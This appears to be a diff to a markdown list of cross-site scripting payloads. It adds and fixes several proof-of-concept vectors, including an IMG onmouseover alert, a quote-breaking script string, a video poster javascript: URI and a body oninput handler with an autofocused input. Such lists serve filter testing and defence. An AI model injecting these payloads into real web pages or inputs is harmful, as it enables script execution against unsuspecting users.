@@ -11,4 +11,8 @@ tags:
 
 <IMG SRC=# onmouseover="alert('xxs')">
 
-\";alert('XSS');//
+";alert('XSS');//
+
+<video poster=javascript:alert(1)//></video>
+
+<body oninput=alert(1)><input autofocus>
